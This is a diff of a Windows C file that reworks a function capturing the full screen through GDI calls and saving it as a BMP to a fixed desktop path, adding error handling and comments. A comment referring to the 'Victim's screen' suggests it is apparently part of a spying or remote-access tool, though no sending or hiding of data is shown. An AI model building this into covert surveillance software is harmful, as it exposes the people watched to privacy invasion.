@@ -1,73 +1,162 @@
 #include "config.h"
 
-void screenshot()
+int screenshot()
 {
-    int height = GetSystemMetrics(SM_CYVIRTUALSCREEN) - GetSystemMetrics(SM_YVIRTUALSCREEN);
-    int width  = GetSystemMetrics(SM_CXVIRTUALSCREEN) - GetSystemMetrics(SM_XVIRTUALSCREEN);
+	//Get Victim's screen dimensions.
+	int height = GetSystemMetrics(SM_CYVIRTUALSCREEN) - GetSystemMetrics(SM_YVIRTUALSCREEN);
+	int width = GetSystemMetrics(SM_CXVIRTUALSCREEN) - GetSystemMetrics(SM_XVIRTUALSCREEN);
 
-    HDC screenContext = GetDC(NULL);
-    HDC compatContext = CreateCompatibleDC(screenContext);
-    HBITMAP bitmap = CreateCompatibleBitmap(screenContext, width, height);
-    HGDIOBJ old_obj = SelectObject(compatContext, bitmap);
-    int bRet = BitBlt(compatContext, 0, 0, width, height, screenContext, 0, 0, SRCCOPY);
+	//Retrieve a handle to a device context.
+	HDC screenContext = GetDC(NULL);
+	if (!screenContext)
+	{
+		_tprintf(_T("ERROR: GetDC function call."));
+		return 1;
+	}
 
-    createBMPFile(L"C:\\Users\\Franco\\Desktop\\xxx.bmp", createBitmapInfo(bitmap), bitmap, compatContext);
+	//Create a memory device context.
+	HDC compatContext = CreateCompatibleDC(screenContext);
+	if (!compatContext)
+	{
+		_tprintf(_T("ERROR: CreateCompatibleDC function call."));
+		return 1;
+	}
 
-    SelectObject(compatContext, old_obj);
-    DeleteDC(compatContext);
-    ReleaseDC(NULL, screenContext);
-    DeleteObject(bitmap);
+	//Create a bitmap object.
+	HBITMAP bitmap = CreateCompatibleBitmap(screenContext, width, height);
+	if (!bitmap)
+	{
+		_tprintf(_T("ERROR: CreateCompatibleBitmap function call."));
+		return 1;
+	}
+
+	//Select device context object.
+	HGDIOBJ exContext = SelectObject(compatContext, bitmap);
+	if (!exContext)
+	{
+		_tprintf(_T("ERROR: SelectObject function call."));
+		return 1;
+	}
+
+	//performs a bit-block transfer of the color data corresponding to a rectangle 
+	//of pixels from the specified source device context into a destination device context.
+	if (!BitBlt(compatContext, 0, 0, width, height, screenContext, 0, 0, SRCCOPY))
+	{
+		_tprintf(_T("ERROR: BitBlt function call."));
+		return 1;
+	}
+
+	//Creates a file out of the BMP object.
+	if (createBMPFile(_T("C:\\Users\\Franco\\Desktop\\x.bmp"), createBitmapInfo(bitmap), bitmap, compatContext))
+	{
+		_tprintf(_T("ERROR: createBMPFile function call."));
+		return 1;
+	}
+
+	//Delete device context.
+	if (!DeleteDC(compatContext))
+	{
+		_tprintf(_T("ERROR: DeleteDC function call."));
+		return 1;
+	}
+
+	//Release device context.
+	if (!ReleaseDC(NULL, screenContext))
+	{
+		_tprintf(_T("ERROR: ReleaseDC function call."));
+		return 1;
+	}
+
+	//Deletes a logical pen, brush, font, bitmap, region, or palette,
+	//freeing all system resources associated with the object.
+	if (!DeleteObject(bitmap))
+	{
+		_tprintf(_T("ERROR: DeleteObject function call."));
+		return 1;
+	}
+
+	return 0;
 }
 
-PBITMAPINFO createBitmapInfo(HBITMAP hBitmap)
+int createBMPFile(LPTSTR filePath, PBITMAPINFO bitmapInfo, HBITMAP bitmap, HDC compatContext)
 {
-    PBITMAPINFO mapInfo;
-    BITMAP bitmap;
-    WORD colorBits;
+	BITMAPFILEHEADER header;
+	DWORD temp;
 
-    GetObject(hBitmap, sizeof(BITMAP), (LPSTR)&bitmap);
-    colorBits = (WORD)(bitmap.bmPlanes * bitmap.bmBitsPixel);
-    mapInfo = (PBITMAPINFO)malloc(sizeof(BITMAPINFOHEADER));
+	//Set up object for bitmap header.
+	PBITMAPINFOHEADER infoHeader = (PBITMAPINFOHEADER)bitmapInfo;
+	LPBYTE bytes = (LPBYTE)malloc(infoHeader->biSizeImage);
+	HANDLE handle = CreateFile(filePath, GENERIC_WRITE, (DWORD)0, NULL, CREATE_ALWAYS,
+		FILE_ATTRIBUTE_NORMAL, (HANDLE)NULL);
 
-    mapInfo->bmiHeader.biSize         = sizeof(BITMAPINFOHEADER);
-    mapInfo->bmiHeader.biWidth        = bitmap.bmWidth;
-    mapInfo->bmiHeader.biHeight       = bitmap.bmHeight;
-    mapInfo->bmiHeader.biPlanes       = bitmap.bmPlanes;
-    mapInfo->bmiHeader.biBitCount     = bitmap.bmBitsPixel;
-    mapInfo->bmiHeader.biCompression  = BI_RGB;
-    mapInfo->bmiHeader.biClrImportant = 0;
-    mapInfo->bmiHeader.biSizeImage    = ((mapInfo->bmiHeader.biWidth* colorBits+31)&~31)
-                                        /8*mapInfo->bmiHeader.biHeight;
-    return mapInfo;
+	//retrieves the bits of the specified compatible bitmap and  
+	//copies them into a buffer as a DIB using the specified format.                          
+	if (!GetDIBits(compatContext, bitmap, 0, (WORD)infoHeader->biHeight, bytes, bitmapInfo, DIB_RGB_COLORS))
+	{
+		_tprintf(_T("ERROR: GetDIBits function call."));
+		return 1;
+	}
+
+	header.bfType = 0x4d42;
+	header.bfReserved1 = 0;
+	header.bfReserved2 = 0;
+	header.bfOffBits = (DWORD)sizeof(BITMAPFILEHEADER) + infoHeader->biSize
+		+ infoHeader->biClrUsed * sizeof(RGBQUAD);
+	header.bfSize = (DWORD)(sizeof(BITMAPFILEHEADER) + infoHeader->biSize
+		+ infoHeader->biClrUsed * sizeof(RGBQUAD) + infoHeader->biSizeImage);
+
+	//Write to file in 3 steps. Write files infoheader, header, and bitmap data in that order.
+	if (!WriteFile(handle, (LPVOID)&header, sizeof(BITMAPFILEHEADER), (LPDWORD)&temp, NULL))
+	{
+		_tprintf(_T("ERROR: WriteFile function call, infoheader."));
+		return 1;
+	}
+
+	if (!WriteFile(handle, (LPVOID)infoHeader, sizeof(BITMAPINFOHEADER) + infoHeader->biClrUsed
+		* sizeof(RGBQUAD), (LPDWORD)&temp, (NULL)))
+	{
+		_tprintf(_T("ERROR: WriteFile function call, header."));
+		return 1;
+	}
+
+	if (!WriteFile(handle, (LPSTR)bytes, (int)infoHeader->biSizeImage, (LPDWORD)&temp, NULL))
+	{
+		_tprintf(_T("ERROR: WriteFile function call, body."));
+		return 1;
+	}
+
+	//Close handle.
+	if (!CloseHandle(handle))
+	{
+		_tprintf(_T("ERROR: CloseHandle function call."));
+		return 1;
+	}
+
+	//Free allocated memory.
+	free(bytes); free(bitmapInfo);
+
+	return 0;
 }
 
-void createBMPFile(LPTSTR pszFile, PBITMAPINFO pbi, HBITMAP hBMP, HDC hDC)
+PBITMAPINFO createBitmapInfo(HBITMAP bitmapHandle)
 {
-    PBITMAPINFOHEADER infoHeader;
-    BITMAPFILEHEADER header;        
-    HANDLE handle;                 
-    LPBYTE bytes;
-    DWORD temp;
+	BITMAP bitmap;
 
-    infoHeader = (PBITMAPINFOHEADER)pbi;
-    bytes = (LPBYTE)malloc(infoHeader->biSizeImage);
+	//Set up object for bitmap header.
+	GetObject(bitmapHandle, sizeof(BITMAP), (LPSTR)&bitmap);
+	WORD colorBits = (WORD)(bitmap.bmPlanes * bitmap.bmBitsPixel);
+	PBITMAPINFO mapInfo = (PBITMAPINFO)malloc(sizeof(BITMAPINFOHEADER));
 
-    GetDIBits(hDC, hBMP, 0, (WORD)infoHeader->biHeight, bytes, pbi, DIB_RGB_COLORS);
+	//Sets the header information for the bitmap.
+	mapInfo->bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
+	mapInfo->bmiHeader.biWidth = bitmap.bmWidth;
+	mapInfo->bmiHeader.biHeight = bitmap.bmHeight;
+	mapInfo->bmiHeader.biPlanes = bitmap.bmPlanes;
+	mapInfo->bmiHeader.biBitCount = bitmap.bmBitsPixel;
+	mapInfo->bmiHeader.biCompression = BI_RGB;
+	mapInfo->bmiHeader.biClrImportant = 0;
+	mapInfo->bmiHeader.biSizeImage = ((mapInfo->bmiHeader.biWidth * colorBits + 31)
+		& ~31) / 8 * mapInfo->bmiHeader.biHeight;
 
-    handle = CreateFile(pszFile, GENERIC_WRITE, (DWORD)0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, (HANDLE)NULL);
-    header.bfType = 0x4d42;
-    header.bfReserved1 = 0;
-    header.bfReserved2 = 0;
-    header.bfOffBits = (DWORD)sizeof(BITMAPFILEHEADER)  + infoHeader->biSize + infoHeader->biClrUsed * sizeof(RGBQUAD);
-    header.bfSize    = (DWORD)(sizeof(BITMAPFILEHEADER) + infoHeader->biSize + infoHeader->biClrUsed * sizeof(RGBQUAD)
-                       + infoHeader->biSizeImage);
-
-    WriteFile(handle, (LPVOID)&header, sizeof(BITMAPFILEHEADER), (LPDWORD)&temp, NULL);
-    WriteFile(handle, (LPVOID)infoHeader, sizeof(BITMAPINFOHEADER) + infoHeader->biClrUsed *
-                sizeof(RGBQUAD), (LPDWORD)&temp, (NULL));
-    WriteFile(handle, (LPSTR)bytes, (int)infoHeader->biSizeImage, (LPDWORD)&temp, NULL);
-
-    CloseHandle(handle);
-    free(bytes);
-    free(pbi);
+	return mapInfo;
 }
